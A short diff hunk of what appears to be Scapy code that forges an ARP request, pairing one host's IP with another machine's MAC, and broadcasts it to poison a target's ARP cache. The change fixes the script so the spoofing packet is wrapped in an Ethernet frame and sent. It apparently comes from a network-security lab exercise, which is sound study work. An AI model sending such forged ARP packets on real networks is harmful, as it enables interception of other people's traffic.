@@ -13,7 +13,7 @@ E = Ether(dst ="ff:ff:ff:ff:ff:ff")  # Broadcast to all devices
 A = ARP(op=1, psrc=B_IP, hwsrc=M_MAC, pdst=A_IP)
 
 # Combine Ethernet and ARP into a single packet
-pkt = A
+pkt = E/A
 
 # Send the packet
 sendp(pkt)
